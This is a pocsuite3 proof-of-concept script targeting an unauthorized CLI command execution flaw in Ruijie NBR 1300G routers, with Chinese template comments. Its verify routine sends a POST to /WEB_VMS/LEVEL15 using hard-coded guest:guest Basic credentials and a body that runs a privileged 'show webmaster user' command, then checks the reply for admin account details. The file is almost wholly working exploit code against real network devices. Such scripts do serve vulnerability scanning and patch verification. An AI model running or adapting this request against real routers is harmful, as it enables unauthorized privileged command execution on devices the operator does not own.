from collections import OrderedDict
from urllib.parse import urljoin
import re,os
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = ''  #漏洞公开的时间,不知道就写今天
    createDate = ''  # 编写 PoC 的日期
    updateDate = ''  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '锐捷NBR 1300G路由器 越权CLI命令执行漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        :锐捷NBR 1300G路由器 越权CLI命令执行漏洞
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/WEB_VMS/LEVEL15"
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Authorization':'Basic Z3Vlc3Q6Z3Vlc3Q='
            }
        data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.'
        try:
            resq = requests.post(url=url,headers=headers,data=data)
            if  resq.status_code==200 and 'webmaster level' in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)